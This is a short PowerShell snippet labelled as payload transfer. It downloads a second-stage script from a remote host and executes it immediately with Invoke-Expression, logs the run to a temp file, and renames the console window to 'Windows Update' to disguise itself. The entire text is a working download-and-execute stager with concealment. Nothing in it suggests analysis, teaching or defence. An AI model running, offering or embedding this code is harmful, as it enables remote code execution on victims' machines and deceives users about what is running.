
# Payload transfer
try { IEX (Invoke-WebRequest -Uri "https://adatum.com/stage2.ps1" -UseBasicParsing).Content; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append; $Host.UI.RawUI.WindowTitle = "Windows Update" } catch { Write-Warning "Remote fetch failed" }
